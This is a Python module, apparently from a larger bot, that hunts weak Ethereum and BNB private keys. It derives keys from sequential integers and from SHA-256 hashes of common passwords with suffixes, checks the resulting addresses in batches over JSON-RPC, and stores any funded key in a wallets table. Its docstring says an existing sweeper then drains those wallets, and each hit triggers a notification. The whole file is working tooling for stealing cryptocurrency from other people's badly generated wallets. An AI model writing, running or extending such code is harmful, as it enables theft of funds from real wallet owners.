"""Weak-key hunter: sequential integers and brainwallets, batched balance checks.

Nothing here finds a random wallet — the space is too large. It finds keys people
generated badly: 1, 2, 3…, and SHA-256 of common phrases. Progress persists to a
cursor file so restarts continue instead of re-walking the same ground.
Hits are inserted into `wallets`, so the existing sweeper drains them.

Enable with WEAK_ENABLE=1.
"""
import asyncio, hashlib, os, random, time
from eth_account import Account

from . import db, notify
from .pools import CHAINS

ENABLED = os.environ.get("WEAK_ENABLE", "").strip() == "1"
BATCH = 100
PAUSE = (1.2, 2.4)
CHAIN_CYCLE = ("eth", "bnb")
CURSOR = os.path.join(os.environ.get("DATA_DIR", "./data"), "weak.cursor")

WORDS = """password bitcoin ethereum crypto wallet money secret test admin
letmein qwerty 123456 12345678 111111 abc123 iloveyou dragon monkey master
sunshine princess football baseball shadow superman trustno1 hello freedom
genesis satoshi nakamoto blockchain hodl moon lambo diamond hands defi nft
""".split()
SUFFIX = ("", "1", "12", "123", "1234", "!", "2024", "2025", "2026")

_stats = {"cursor": 0, "checked": 0, "hits": 0, "running": False}


def status() -> dict:
    return dict(_stats, enabled=ENABLED)


def _read_cursor() -> int:
    try:
        with open(CURSOR) as f:
            return int(f.read().strip() or 0)
    except Exception:
        return 0


def _write_cursor(n: int) -> None:
    try:
        os.makedirs(os.path.dirname(CURSOR) or ".", exist_ok=True)
        with open(CURSOR, "w") as f:
            f.write(str(n))
    except Exception:
        pass


def _candidates(start: int, n: int):
    """Yield (label, private_key_hex) pairs from two cheap sources."""
    for i in range(start, start + n // 2):
        yield f"seq:{i}", "%064x" % i
    base = _read_cursor() // max(1, n // 2)
    for j in range(n - n // 2):
        w = WORDS[(base + j) % len(WORDS)] + SUFFIX[(base + j) % len(SUFFIX)]
        yield f"brain:{w}", hashlib.sha256(w.encode()).hexdigest()


async def _balances(client, url, addrs):
    payload = [{"jsonrpc": "2.0", "id": i, "method": "eth_getBalance",
                "params": [a, "latest"]} for i, a in enumerate(addrs)]
    try:
        r = await client.post(url, json=payload)
        rows = r.json()
    except Exception:
        return [0] * len(addrs)
    out = [0] * len(addrs)
    for item in rows if isinstance(rows, list) else []:
        try:
            out[int(item["id"])] = int(item["result"], 16)
        except Exception:
            pass
    return out


async def run_batch() -> int:
    import httpx

    start = _read_cursor()
    pairs = list(_candidates(start, BATCH))
    chain = CHAIN_CYCLE[(start // BATCH) % len(CHAIN_CYCLE)]
    url = CHAINS[chain]

    addrs, keys, labels = [], [], []
    for label, pk in pairs:
        try:
            a = Account.from_key(pk).address
        except Exception:
            continue
        addrs.append(a)
        keys.append(pk)
        labels.append(label)

    async with httpx.AsyncClient(timeout=20) as client:
        bals = await _balances(client, url, addrs)

    hits = 0
    for addr, pk, label, bal in zip(addrs, keys, labels, bals):
        if bal <= 0:
            continue
        if db.one("SELECT 1 FROM wallets WHERE address=?", (addr,)):
            continue
        db.run("""INSERT INTO wallets(tg_id,chain,address,pk,label,ts)
                  VALUES(NULL,?,?,?,?,?)""",
               (chain, addr, pk, f"weak {label}", int(time.time())))
        db.log(f"weak hit {chain} {addr} {label}")
        notify.fire(f"weak key hit on {chain}\n{addr}\n{label}")
        hits += 1

    _stats.update(cursor=start + BATCH, checked=_stats["checked"] + len(addrs),
                  hits=_stats["hits"] + hits)
    _write_cursor(start + BATCH)
    return hits


async def loop():
    if not ENABLED:
        return
    _stats["cursor"] = _read_cursor()
    _stats["running"] = True
    await asyncio.sleep(30)
    while True:
        try:
            await run_batch()
        except Exception as e:
            db.log(f"weak {type(e).__name__}: {e}", lvl="warn")
        await asyncio.sleep(random.uniform(*PAUSE))